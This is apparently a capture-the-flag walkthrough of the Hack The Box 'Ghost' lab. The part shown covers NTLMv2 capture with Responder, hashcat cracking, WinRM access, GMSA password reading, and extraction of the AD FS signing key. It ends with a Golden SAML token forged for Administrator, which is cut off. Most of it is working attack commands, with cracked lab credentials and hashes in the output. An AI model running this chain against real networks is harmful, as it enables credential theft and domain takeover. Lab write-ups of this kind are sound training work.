

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.15.113]
    Responder IPv6             [fe80::d434:3c85:e826:411f]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-YM607OB9NT0]
    Responder Domain Name      [XI26.LOCAL]
    Responder DCE-RPC Port     [48758]

[*] Version: Responder 3.2.2.0
[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>

[+] Listening for events...                                                                                         

[HTTP] NTLMv2 Client   : 10.129.10.74
[HTTP] NTLMv2 Username : ghost\justin.bradley
[HTTP] NTLMv2 Hash     : justin.bradley::ghost:e6461922a7c85ce0:94D0CE735FA44A0248DB47FEB34B0A29:010100000000000046CD97A7F1BADC01F5DC147D4BEBA5F10000000002000800580049003200360001001E00570049004E002D0059004D003600300037004F00420039004E00540030000400140058004900320036002E004C004F00430041004C0003003400570049004E002D0059004D003600300037004F00420039004E00540030002E0058004900320036002E004C004F00430041004C000500140058004900320036002E004C004F00430041004C0008003000300000000000000000000000004000004423788F1FC921B6DCCA13F265EBA392946C99E54324EFFF760E771776C7CF7E0A001000000000000000000000000000000000000900300048005400540050002F006200690074006200750063006B00650074002E00670068006F00730074002E006800740062000000000000000000                                                                                               
[+] Exiting...
```

Lets crack the NTLMv2:
```hashcat
hashcat -m 5600 justin.hash /usr/share/wordlists/rockyou.txt                                        
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-AMD Ryzen 5 5600 6-Core Processor, 4225/8450 MB (2048 MB allocatable), 8MCU
JUSTIN.BRADLEY::ghost:e6461922a7c85ce0:94d0ce735fa44a0248db47feb34b0a29:010100000000000046cd97a7f1badc01f5dc147d4beba5f10000000002000800580049003200360001001e00570049004e002d0059004d003600300037004f00420039004e00540030000400140058004900320036002e004c004f00430041004c0003003400570049004e002d0059004d003600300037004f00420039004e00540030002e0058004900320036002e004c004f00430041004c000500140058004900320036002e004c004f00430041004c0008003000300000000000000000000000004000004423788f1fc921b6dcca13f265eba392946c99e54324efff760e771776c7cf7e0a001000000000000000000000000000000000000900300048005400540050002f006200690074006200750063006b00650074002e00670068006f00730074002e006800740062000000000000000000:Qwertyuiop1234$$
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: JUSTIN.BRADLEY::ghost:e6461922a7c85ce0:94d0ce735fa4...000000
Time.Started.....: Mon Mar 23 18:28:36 2026 (6 secs)
Time.Estimated...: Mon Mar 23 18:28:42 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  1748.0 kH/s (1.58ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 10715136/14344385 (74.70%)
Rejected.........: 0/10715136 (0.00%)
Restore.Point....: 10706944/14344385 (74.64%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: RAHRISMA -> Q112143
Hardware.Mon.#01.: Util: 28%
```

we cracked the hash so now we have creds for Justin:
`JUSTIN.BRADLEY:Qwertyuiop1234$$`

so after checking AD using bloodhound we see that Justin is part of the remote users group so we Winrm:
```Powershell
evil-winrm -i ghost.htb -u justin.bradley -p 'Qwertyuiop1234$$'
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                                                        
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                                                   
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\justin.bradley\Documents> ls


    Directory: C:\Users\justin.bradley\Documents


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          2/4/2024   1:51 PM                WindowsPowerShell


*Evil-WinRM* PS C:\Users\justin.bradley\Documents> cd ..
*Evil-WinRM* PS C:\Users\justin.bradley> cd Desktop
*Evil-WinRM* PS C:\Users\justin.bradley\Desktop> dir


    Directory: C:\Users\justin.bradley\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---         3/22/2026   7:21 PM             34 user.txt


*Evil-WinRM* PS C:\Users\justin.bradley\Desktop> type user.txt
80832c85752a3ad885e8463526c3771b
*Evil-WinRM* PS C:\Users\justin.bradley\Desktop> 
```

so after checking bloodhound we see that Justin can read the gmsa passwords:
![[Pasted image 20260323114150.png]]

so lets confirm this using netexec and bloodyAD:
```bash
┌──(nt0wl㉿kali)-[~/Machines/HackTheBox/Ghost]
└─$ nxc ldap 10.129.10.74 -u justin.bradley -p 'Qwertyuiop1234$$' --gmsa                            
LDAP        10.129.10.74    389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:ghost.htb) (signing:None) (channel binding:Never)
LDAP        10.129.10.74    389    DC01             [+] ghost.htb\justin.bradley:Qwertyuiop1234$$ 
LDAP        10.129.10.74    389    DC01             [*] Getting GMSA Passwords
LDAP        10.129.10.74    389    DC01             Account: adfs_gmsa$           NTLM: f17a2d2b9359d50fe9448a3219592eea     PrincipalsAllowedToReadPassword: ['DC01$', 'justin.bradley']                                               
                                                                                                                    
┌──(nt0wl㉿kali)-[~/Machines/HackTheBox/Ghost]
└─$ bloodyAD -u justin.bradley -p 'Qwertyuiop1234$$' -d ghost.htb --host 10.129.10.74 get object 'ADFS_GMSA$' --attr msDS-ManagedPassword 

distinguishedName: CN=adfs_gmsa,CN=Managed Service Accounts,DC=ghost,DC=htb
msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:f17a2d2b9359d50fe9448a3219592eea
msDS-ManagedPassword.B64ENCODED: jkw1Hejl04hhaK4ZFEc9v770BdyNza0gjY9thRpdBAUygk8V++PeCrIyqAqRZuuNThfekrJekUHVV+bx6zK4jMqeHaA2hg7CoeEJvFcyeV0Bf6s4yChVqBcb6kpErDpo+A7Cnlo3agpXmFysPZl59Z4orL+eDsIrafGti25JWYZVVO2czz5EEUSYOmilTUFAETAmg5iGC69lCfzijwOZdIC1latTuxSr3YlYG5EYL1ksSTV+X61zOaJnrQI7jYvU+ChJt1pRcMTgiP4B+VY5DXhwVAy5O7J3q7rdoQJ/0aCcDWd3Bj74KBaJgxL2S1TKvUJpCdNTPXcjLqjJJtpfrw==
```

we get `adfs_gmsa$:f17a2d2b9359d50fe9448a3219592eea`
and with this lets check if our creds work, which i tried this against smb shares:
```bash
netexec smb ghost.htb -u 'adfs_gmsa$' -H 'f17a2d2b9359d50fe9448a3219592eea' --shares
SMB         10.129.10.74    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:ghost.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.10.74    445    DC01             [+] ghost.htb\adfs_gmsa$:f17a2d2b9359d50fe9448a3219592eea 
SMB         10.129.10.74    445    DC01             [*] Enumerated shares
SMB         10.129.10.74    445    DC01             Share           Permissions     Remark
SMB         10.129.10.74    445    DC01             -----           -----------     ------
SMB         10.129.10.74    445    DC01             ADMIN$                          Remote Admin
SMB         10.129.10.74    445    DC01             C$                              Default share
SMB         10.129.10.74    445    DC01             IPC$            READ            Remote IPC
SMB         10.129.10.74    445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.10.74    445    DC01             SYSVOL          READ            Logon server share 
SMB         10.129.10.74    445    DC01             Users           READ 
```

we connect to evil-winrm and run ADFSdump:
```bash
*Evil-WinRM* PS C:\Users\adfs_gmsa$\Documents> upload ADFSDump.exe
                                        
Info: Uploading /home/nt0wl/Machines/HackTheBox/Ghost/ADFSDump.exe to C:\Users\adfs_gmsa$\Documents\ADFSDump.exe
                                        
Data: 38912 bytes of 38912 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\Users\adfs_gmsa$\Documents> .\ADFSDump.exe
    ___    ____  ___________ ____
   /   |  / __ \/ ____/ ___// __ \__  ______ ___  ____
  / /| | / / / / /_   \__ \/ / / / / / / __ `__ \/ __ \
 / ___ |/ /_/ / __/  ___/ / /_/ / /_/ / / / / / / /_/ /
/_/  |_/_____/_/    /____/_____/\__,_/_/ /_/ /_/ .___/
                                              /_/
Created by @doughsec


## Extracting Private Key from Active Directory Store
[-] Domain is ghost.htb
[-] Private Key: FA-DB-3A-06-DD-CD-40-57-DD-41-7D-81-07-A0-F4-B3-14-FA-2B-6B-70-BB-BB-F5-28-A7-21-29-61-CB-21-C7


[-] Private Key: 8D-AC-A4-90-70-2B-3F-D6-08-D5-BC-35-A9-84-87-56-D2-FA-3B-7B-74-13-A3-C6-2C-58-A6-F4-58-FB-9D-A1


## Reading Encrypted Signing Key from Database
[-] Encrypted Token Signing Key Begin
AAAAAQAAAAAEEAFyHlNXh2VDska8KMTxXboGCWCGSAFlAwQCAQYJYIZIAWUDBAIBBglghkgBZQMEAQIEIN38LpiFTpYLox2V3SL3knZBg16utbeqqwIestbeUG4eBBBJvH3Vzj/Slve2Mo4AmjytIIIQoMESvyRB6RLWIoeJzgZOngBMCuZR8UAfqYsWK2XKYwRzZKiMCn6hLezlrhD8ZoaAaaO1IjdwMBButAFkCFB3/DoFQ/9cm33xSmmBHfrtufhYxpFiAKNAh1stkM2zxmPLdkm2jDlAjGiRbpCQrXhtaR+z1tYd4m8JhBr3XDSURrJzmnIDMQH8pol+wGqKIGh4xl9BgNPLpNqyT56/59TC7XtWUnCYybr7nd9XhAbOAGH/Am4VMlBTZZK8dbnAmwirE2fhcvfZw+ERPjnrVLEpSDId8rgIu6lCWzaKdbvdKDPDxQcJuT/TAoYFZL9OyKsC6GFuuNN1FHgLSzJThd8FjUMTMoGZq3Cl7HlxZwUDzMv3mS6RaXZaY/zxFVQwBYquxnC0z71vxEpixrGg3vEs7ADQynEbJtgsy8EceDMtw6mxgsGloUhS5ar6ZUE3Qb/DlvmZtSKPaT4ft/x4MZzxNXRNEtS+D/bgwWBeo3dh85LgKcfjTziAXH8DeTN1Vx7WIyT5v50dPJXJOsHfBPzvr1lgwtm6KE/tZALjatkiqAMUDeGG0hOmoF9dGO7h2FhMqIdz4UjMay3Wq0WhcowntSPPQMYVJEyvzhqu8A0rnj/FC/IRB2omJirdfsserN+WmydVlQqvcdhV1jwMmOtG2vm6JpfChaWt2ou59U2MMHiiu8TzGY1uPfEyeuyAr51EKzqrgIEaJIzV1BHKm1p+xAts0F5LkOdK4qKojXQNxiacLd5ADTNamiIcRPI8AVCIyoVOIDpICfei1NTkbWTEX/IiVTxUO1QCE4EyTz/WOXw3rSZA546wsl6QORSUGzdAToI64tapkbvYpbNSIuLdHqGplvaYSGS2Iomtm48YWdGO5ec4KjjAWamsCwVEbbVwr9eZ8N48gfcGMq13ZgnCd43LCLXlBfdWonmgOoYmlqeFXzY5OZAK77YvXlGL94opCoIlRdKMhB02Ktt+rakCxxWEFmdNiLUS+SdRDcGSHrXMaBc3AXeTBq09tPLxpMQmiJidiNC4qjPvZhxouPRxMz75OWL2Lv1zwGDWjnTAm8TKafTcfWsIO0n3aUlDDE4tVURDrEsoI10rBApTM/2RK6oTUUG25wEmsIL9Ru7AHRMYqKSr9uRqhIpVhWoQJlSCAoh+Iq2nf26sBAev2Hrd84RBdoFHIbe7vpotHNCZ/pE0s0QvpMUU46HPy3NG9sR/OI2lxxZDKiSNdXQyQ5vWcf/UpXuDL8Kh0pW/bjjfbWqMDyi77AjBdXUce6Bg+LN32ikxy2pP35n1zNOy9vBCOY5WXzaf0e+PU1woRkUPrzQFjX1nE7HgjskmA4KX5JGPwBudwxqzHaSUfEIM6NLhbyVpCKGqoiGF6Jx1uihzvB98nDM9qDTwinlGyB4MTCgDaudLi0a4aQoINcRvBgs84fW+XDj7KVkH65QO7TxkUDSu3ADENQjDNPoPm0uCJprlpWeI9+EbsVy27fe0ZTG03lA5M7xmi4MyCR9R9UPz8/YBTOWmK32qm95nRct0vMYNSNQB4V/u3oIZq46J9FDtnDX1NYg9/kCADCwD/UiTfNYOruYGmWa3ziaviKJnAWmsDWGxP8l35nZ6SogqvG51K85ONdimS3FGktrV1pIXM6/bbqKhWrogQC7lJbXsrWCzrtHEoOz2KTqw93P0WjPE3dRRjT1S9KPsYvLYvyqNhxEgZirxgccP6cM0N0ZUfaEJtP21sXlq4P1Q24bgluZFG1XbDA8tDbCWvRY1qD3CNYCnYeqD4e7rgxRyrmVFzkXEFrIAkkq1g8MEYhCOn3M3lfHi1L6de98AJ9nMqAAD7gulvvZpdxeGkl3xQ+jeQGu8mDHp7PZPY+uKf5w87J6l48rhOk1Aq+OkjJRIQaFMeOFJnSi1mqHXjPZIqXPWGXKxTW7P+zF8yXTk5o0mHETsYQErFjU40TObPK1mn2DpPRbCjszpBdA3Bx2zVlfo3rhPVUJv2vNUoEX1B0n+BE2DoEI0TeZHM/gS4dZLfV/+q8vTQPnGFhpvU5mWnlAqrn71VSb+BarPGoTNjHJqRsAp7lh0zxVxz9J4xWfX5HPZ9qztF1mGPyGr/8uYnOMdd+4ndeKyxIOfl4fce91CoYkSsM95ZwsEcRPuf5gvHdqSi1rYdCrecO+RChoMwvLO8+MTEBPUNQ8YVcQyecxjaZtYtK+GZqyQUaNyef4V6tcjreFQF93oqDqvm5CJpmBcomVmIrKu8X7TRdmSuz9LhjiYXM+RHhNi6v8Y2rHfQRspKM4rDyfdqu1D+jNuRMyLc/X573GkMcBTiisY1R+8k2O46jOMxZG5NtoL2FETir85KBjM9Jg+2nlHgAiCBLmwbxOkPiIW3J120gLkIo9MF2kXWBbSy6BqNu9dPqOjSAaEoH+Jzm4KkeLrJVqLGzx0SAm3KHKfBPPECqj+AVBCVDNFk6fDWAGEN+LI/I61IEOXIdK1HwVBBNj9LP83KMW+DYdJaR+aONjWZIoYXKjvS8iGET5vx8omuZ3Rqj9nTRBbyQdT9dVXKqHzsK5EqU1W1hko3b9sNIVLnZGIzCaJkAEh293vPMi2bBzxiBNTvOsyTM0Evin2Q/v8Bp8Xcxv/JZQmjkZsLzKZbAkcwUf7+/ilxPDFVddTt+TcdVP0Aj8Wnxkd9vUP0Tbar6iHndHfvnsHVmoEcFy1cb1mBH9kGkHBu2PUl/9UySrTRVNv+oTlf+ZS/HBatxsejAxd4YN/AYanmswz9FxF96ASJTX64KLXJ9HYDNumw0+KmBUv8Mfu14h/2wgMaTDGgnrnDQAJZmo40KDAJ4WV5Akmf1K2tPginqo2qiZYdwS0dWqnnEOT0p+qR++cAae16Ey3cku52JxQ2UWQL8EB87vtp9YipG2C/3MPMBKa6TtR1nu/C3C/38UBGMfclAb0pfb7dhuT3mV9antYFcA6LTF9ECSfbhFobG6WS8tWJimVwBiFkE0GKzQRnvgjx7B1MeAuLF8fGj7HwqQKIVD5vHh7WhXwuyRpF3kRThbkS8ZadKpDH6FUDiaCtQ1l8mEC8511dTvfTHsRFO1j+wZweroWFGur4Is197IbdEiFVp/zDvChzWXy071fwwJQyGdOBNmra1sU8nAtHAfRgdurHiZowVkhLRZZf3UM76OOM8cvs46rv5F3K++b0F+cAbs/9aAgf49Jdy328jT0ir5Q+b3eYss2ScLJf02FiiskhYB9w7EcA+WDMu0aAJDAxhy8weEFh72VDBAZkRis0EGXrLoRrKU60ZM38glsJjzxbSnHsp1z1F9gZXre4xYwxm7J799FtTYrdXfQggTWqj+uTwV5nmGki/8CnZX23jGkne6tyLwoMRNbIiGPQZ4hGwNhoA6kItBPRAHJs4rhKOeWNzZ+sJeDwOiIAjb+V0FgqrIOcP/orotBBSQGaNUpwjLKRPx2nlI1VHSImDXizC6YvbKcnSo3WZB7NXIyTaUmKtV9h+27/NP+aChhILTcRe4WvA0g+QTG5ft9GSuqX94H+mX2zVEPD2Z5YN2UwqeA2EAvWJDTcSN/pDrDBQZD2kMB8P4Q7jPauEPCRECgy43se/DU+P63NBFTa5tkgmG2+E05RXnyP+KZPWeUP/lXOIA6PNvyhzzobx52OAewljfBizErthcAffnyPt6+zPdqHZMlfrkn+SY0JSMeR7pq0RIgZy0sa692+XtIcHYUcpaPl9hwRjE/5dpRtyt3w9fXR4dtf+rf+O2NI7h0l1xdmcShiRxHfp+9AZTz0H0aguK9aCZY7Sc9WR0X4nv0vSQB7fzFTNG+hOr0PcOh+KIETfiR9KUerB1zbpW+XEUcG9wCyb8OMc4ndpo1WbzLAn7WNDTY9UcHmFJFVmRGbLt2+Pe5fikQxIVLfRCwUikNeKY/3YiOJV3XhA6x6e2zjN3I/Tfo1/eldj0IbE7RP4ptUjyuWkLcnWNHZr8YhLaWTbucDI8R8MXAjZqNCX7WvJ5i+YzJ8S+IQbM8R2DKeFXOTTV3w6gL1rAYUpF9xwe6CCItxrsP3v59mn21bvj3HunOEJI3aAoStJgtO4K+SOeIx+Fa7dLxpTEDecoNsj6hjMdGsrqzuolZX/GBF1SotrYN+W63MYSiZps6bWpc8WkCsIqMiOaGa1eNLvAlupUNGSBlcXNogdKU0R6AFKM60AN2FFd7n4R5TC76ZHIKGmxUcq9EuYdeqamw0TB4fW0YMW4OZqQyx6Z8m3J7hA2uZfB7jYBl2myMeBzqwQYTsEqxqV3QuT2uOwfAi5nknlWUWRvWJl4Ktjzdv3Ni+8O11M+F5gT1/6E9MfchK0GK2tOM6qI8qrroLMNjBHLv4XKAx6rEJsTjPTwaby8IpYjg6jc7DSJxNT+W9F82wYc7b3nBzmuIPk8LUfQb7QQLJjli+nemOc20fIrHZmTlPAh07OhK44/aRELISKPsR2Vjc/0bNiX8rIDjkvrD/KaJ8yDKdoQYHw8G+hU3dZMNpYseefw5KmI9q+SWRZEYJCPmFOS+DyQAiKxMi+hrmaZUsyeHv96cpo2OkAXNiF3T5dpHSXxLqIHJh3JvnFP9y2ZY+w9ahSR6Rlai+SokV5TLTCY7ah9yP/W1IwGuA4kyb0Tx8sdE0S/5p1A63+VwhuANv2NHqI+YDXCKW4QmwYTAeJuMjW/mY8hewBDw+xAbSaY4RklYL85fMByon9AMe55Jaozk8X8IvcW6+m3V/zkKRG7srLX5R7ii3C4epaZPVC5NjNgpBkpT31X7ZZZIyphQIRNNkAve49oaquxVVcrDNyKjmkkm8XSHHn153z/yK3mInTMwr2FJU3W7L/Kkvprl34Tp5fxC7G/KRJV7/GKIlBLU0BlNZbuDm7sYPpRdzhAkna4+c4r8gb2M5Qjasqit7kuPeCRSxkCgmBhrdvg4PCU6QRueIZ795qjWPKeJOs88c7sdADJiRjQSrcUGCAU59wTG0vB4hhO3D87sbdXCEa74/YXiR7mFgc7upx/JpV+KcCEVPdJQAhpfyVJGmWDJZBvVXoNC2XInsJZJf81Oz+qBxbZo+ZzJxeqxgROdxc+q5Qy6c+CC8Kg3ljMQNdzxpk6AVd0/nbhdcPPmyG6tHZVEtNWoLW5SgdSWf/M0tltJ/yRii0hxFBVQwRgFSmsKZIDzk5+OktW7Rq3VgxS4dj97ejfFbnoEbbvKl9STRPw/vuRbQaQF15ZnwlQ0fvtWuWbJUTiwXeWmp1yQMU/qWMV/LtyGRl4eZuROzBjd+ujf8/Q6YSdAMR/o6ziKBHXrzaF8dH9XizNux0kPdCgtcpWfW+aKEeiWiYDxpOzR8Wmcn+Th0hDD9+P5YeZ85p/NkedO7eRMi38lOIBU2nT3oupJMGnnNj1EUd2z8gMcW/+VekgfN+ku5yxi3b9pvUIiCatHgp6RRb70fdNkyUa6ahxM5zS1dL/joGuoIJe26lpgqpYz1vZa15VKuCRU6v62HtqsOnB5sn6IhR16z3H416uFmXc9k4WRZQ0zrZjdFm+WPAHoWAufzAdZP/pdYv1IsrDoXsIAyAgw3rEzcwKs6XA5K9kihMIZXXEvtU2rsNGevNCjFqNMAS9BeNi9r/XjHDXnFZv6OQpfYJUPiUmumE+DYXZ/AP/MPSDrCkLKVPyip7xDevBN/BEsNEUSTXxm
[-] Encrypted Token Signing Key End

[-] Certificate value: 0818F900456D4642F29C6C88D26A59E5A7749EBC
[-] Store location value: CurrentUser
[-] Store name value: My

## Reading The Issuer Identifier
[-] Issuer Identifier: http://federation.ghost.htb/adfs/services/trust
[-] Detected AD FS 2019
[-] Uncharted territory! This might not work...
## Reading Relying Party Trust Information from Database
[-]
core.ghost.htb
 ==================
    Enabled: True
    Sign-In Protocol: SAML 2.0
    Sign-In Endpoint: https://core.ghost.htb:8443/adfs/saml/postResponse
    Signature Algorithm: http://www.w3.org/2001/04/xmldsig-more#rsa-sha256
    SamlResponseSignatureType: 1;
    Identifier: https://core.ghost.htb:8443
    Access Policy: <PolicyMetadata xmlns:i="http://www.w3.org/2001/XMLSchema-instance" xmlns="http://schemas.datacontract.org/2012/04/ADFS">
  <RequireFreshAuthentication>false</RequireFreshAuthentication>
  <IssuanceAuthorizationRules>
    <Rule>
      <Conditions>
        <Condition i:type="AlwaysCondition">
          <Operator>IsPresent</Operator>
        </Condition>
      </Conditions>
    </Rule>
  </IssuanceAuthorizationRules>
</PolicyMetadata>


    Access Policy Parameter:

    Issuance Rules: @RuleTemplate = "LdapClaims"
@RuleName = "LdapClaims"
c:[Type == "http://schemas.microsoft.com/ws/2008/06/identity/claims/windowsaccountname", Issuer == "AD AUTHORITY"]
 => issue(store = "Active Directory", types = ("http://schemas.xmlsoap.org/ws/2005/05/identity/claims/upn", "http://schemas.xmlsoap.org/claims/CommonName"), query = ";userPrincipalName,sAMAccountName;{0}", param = c.Value);
```

so lets use ADFSpoof(**P.S python 3.11 is needed for this tool to work**):
```bash
python3.11 ADFSpoof.py -b encryptionPfx.bin decryptionKey.bin -s 'core.ghost.htb' saml2 --endpoint 'https://core.ghost.htb:8443/adfs/saml/postResponse' --nameidformat 'urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress' --nameid 'Administrator@ghost.htb' --rpidentifier 'https://core.ghost.htb:8443' --assertions '<Attribute Name="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/upn"><AttributeValue>Administrator@ghost.htb</AttributeValue></Attribute><Attribute Name="http://schemas.xmlsoap.org/claims/CommonName"><AttributeValue>Administrator</AttributeValue></Attribute>'
    ___    ____  ___________                   ____
   /   |  / __ \/ ____/ ___/____  ____  ____  / __/
  / /| | / / / / /_   \__ \/ __ \/ __ \/ __ \/ /_  
 / ___ |/ /_/ / __/  ___/ / /_/ / /_/ / /_/ / __/  
/_/  |_/_____/_/    /____/ .___/\____/\____/_/     
                        /_/                        

A tool to for AD FS security tokens
Created by @doughsec

PHNhbWxwOlJlc3BvbnNlIHhtbG5zOnNhbWxwPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6cHJvdG9jb2wiIElEPSJfNlc1VVRTIiBWZXJzaW9uPSIyLjAiIElzc3VlSW5zdGFudD0iMjAyNi0wMy0yM1QyMDo1Njo1My4wMDBaIiBEZXN0aW5hdGlvbj0iaHR0cHM6Ly9jb3JlLmdob3N0Lmh0Yjo4NDQzL2FkZnMvc2FtbC9wb3N0UmVzcG9uc2UiIENvbnNlbnQ9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDpjb25zZW50OnVuc3BlY2lmaWVkIj48SXNzdWVyIHhtbG5zPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6YXNzZXJ0aW9uIj5odHRwOi8vY29yZS5naG9zdC5odGIvYWRmcy9zZXJ2aWNlcy90cnVzdDwvSXNzdWVyPjxzYW1scDpTdGF0dXM%2BPHNhbWxwOlN0YXR1c0NvZGUgVmFsdWU9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDpzdGF0dXM6U3VjY2VzcyIvPjwvc2FtbHA6U3RhdHVzPjxBc3NlcnRpb24geG1sbnM9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDphc3NlcnRpb24iIElEPSJfR0c5SlVTIiBJc3N1ZUluc3RhbnQ9IjIwMjYtMDMtMjNUMjA6NTY6NTMuMDAwWiIgVmVyc2lvbj0iMi4wIj48SXNzdWVyPmh0dHA6Ly9jb3JlLmdob3N0Lmh0Yi9hZGZzL3NlcnZpY2VzL3RydXN0PC9Jc3N1ZXI%2BPGRzOlNpZ25hdHVyZSB4bWxuczpkcz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC8wOS94bWxkc2lnIyI%2BPGRzOlNpZ25lZEluZm8%2BPGRzOkNhbm9uaWNhbGl6YXRpb25NZXRob2QgQWxnb3JpdGhtPSJodHRwOi8vd3d3LnczLm9yZy8yMDAxLzEwL3htbC1leGMtYzE0biMiLz48ZHM6U2lnbmF0dXJlTWV0aG9kIEFsZ29yaXRobT0iaHR0cDovL3d3dy53My5vcmcvMjAwMS8wNC94bWxkc2lnLW1vcmUjcnNhLXNoYTI1NiIvPjxkczpSZWZlcmVuY2UgVVJJPSIjX0dHOUpVUyI%2BPGRzOlRyYW5zZm9ybXM%2BPGRzOlRyYW5zZm9ybSBBbGdvcml0aG09Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvMDkveG1sZHNpZyNlbnZlbG9wZWQtc2lnbmF0dXJlIi8%2BPGRzOlRyYW5zZm9ybSBBbGdvcml0aG09Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvMTAveG1sLWV4Yy1jMTRuIyIvPjwvZHM6VHJhbnNmb3Jtcz48ZHM6RGlnZXN0TWV0aG9kIEFsZ29yaXRobT0iaHR0cDovL3d3dy53My5vcmcvMjAwMS8wNC94bWxlbmMjc2hhMjU2Ii8%2BPGRzOkRpZ2VzdFZhbHVlPkVjMlFabTdBa01Ocmt4Slk5NGVsc1VIRVdDSC9uWVM4dWMzUE14NjhhdTg9PC9kczpEaWdlc3RWYWx1ZT48L2RzOlJlZmVyZW5jZT48L2RzOlNpZ25lZEluZm8%2BPGRzOlNpZ25hdHVyZVZhbHVlPlBQN0YvVnQrcnF1M2piUDFxZzVlYmovU2x2NVhGVnpOa0hQK29nbll5R0NvbXBnS2xzZ2QyT0Y1YnluNW1zMGxaZTVobUthc2tOWnZpQjQvWURETm81YTVjaDBDcjRlclZzT1lHdFd0KzU1aEFvOVFES2xpVkI3enM5NGMvOEFDRkt2Y2tPS05DSVUvQW1YVXZxSFpreklHMHZBS0VQaHRZSmdiTFFlUFYyTXdQQlJuOTRiYlBlRzVMaW90Mzd6bUIrK08zNUt2YmpmS2RuTjBsMFljTUJnSGs3UXNPMnZ4Mkk5SExXcE81UjA3bUdrRWRsYUhtZGloUTJKM0FWOCtkODcwYzdQTVlSd0RkU0pNREFwQ2NoNnlkVW5CM3k5NVhlMFhLdm1IS1VjeWlpc1V1VGlUUi9qTkxLUDNseTYwRXlkWW1JbXJDc2VHMTdRNjNWMEM0Z3hHWk1YMGgyK01VT2w0U0psTWhzaUFwTExMZGthMGRkSGxhUXl1TVpMMmRWcCtFa3lDUnp1M0JsRm11UldHcTFmSm5TZ1Y1S215UFRRNHFQNUtsZXM1SktId3lNYThvWndXck5YWG05YkVKYmk2akpiNTJ3amRXM2lJMERwVzJpNVFpeEpURzNLNjY2dzRpSVRZTE1zMGF3Ry9uWjRDaTRuMEhEOTZueXQ0Si9ZbXNEdEJyaXpOZGJaTUx5RTlnYTNRamlTOHJYd3dQL3AxM1Brbm1wQ1J3RCtKUGtsYUxGY1phVEJnUTFkeUcyZFF6SDdVQ3FSeFBzdFVCNldrOW9QaXFMYWZ2a2tIUkIvYU1wMmlDdkQzaXo3OWZOSSswUEIxZ09RbjhXZ1ZOOGRyZC80bTdaYllqS3dIeS94NmFWMUpGb3J2V3BUMXk0L1hIV1VjTmNNPTwvZHM6U2lnbmF0dXJlVmFsdWU%2BPGRzOktleUluZm8%2BPGRzOlg1MDlEYXRhPjxkczpYNTA5Q2VydGlmaWNhdGU%2BTUlJRTVqQ0NBczZnQXdJQkFnSVFKRmNXd015YlJhNU80K1dPNXRXb0dUQU5CZ2txaGtpRzl3MEJBUXNGQURBdU1Td3dLZ1lEVlFRREV5TkJSRVpUSUZOcFoyNXBibWNnTFNCbVpXUmxjbUYwYVc5dUxtZG9iM04wTG1oMFlqQWdGdzB5TkRBMk1UZ3hOakUzTVRCYUdBOHlNVEEwTURVek1ERTJNVGN4TUZvd0xqRXNNQ29HQTFVRUF4TWpRVVJHVXlCVGFXZHVhVzVuSUMwZ1ptVmtaWEpoZEdsdmJpNW5hRzl6ZEM1b2RHSXdnZ0lpTUEwR0NTcUdTSWIzRFFFQkFRVUFBNElDRHdBd2dnSUtBb0lDQVFDK0FBT0lmRXF0bFljbjE1M0wxQnZHUWdEeVhUbll3VFJ6c0s1OSt6RTF6Z0dLTzlONW5iOEZrK2RhS3BXTFFhaUg3b0RIYWVudy9RYXhCZzVxZGVEWW1EM296OEt5YUExeWdZQnJ6bTR3VzdGZjg3cks5RmU1SjUvaDZXOWc3NDloNUJJcVBRT3AwbDZzMXJmdW1PY2NONHliVzk1RVdOTDB2dVFYdkMrS1E0RDRnTVh1OG1DR3B4dHZJTDhpbE50SnVJRzNPUllTS2hSYWwweXlKZU9oRzR4Z2xyWkpGMThwOXdobkU2b21nZ21BNm4yc2hEay90dlRZamlpNWU3L2ljV1RLa3JzTUNwYUtVTms3bXhkTVpoUWFiN1NtZktyWk40cFJEN2RWZzV6ekl5RDdVelM5Q0hMQzZ4TnpxL1owaHVhT2FKaE9TZEpTZ2F0L2JzRzhuYngxOUhELyt5cFc5SjJMdE5GdWdkV3RtVUJXRE9RQllWaEI4U2c0VkVHZ1A5anlJdEhIM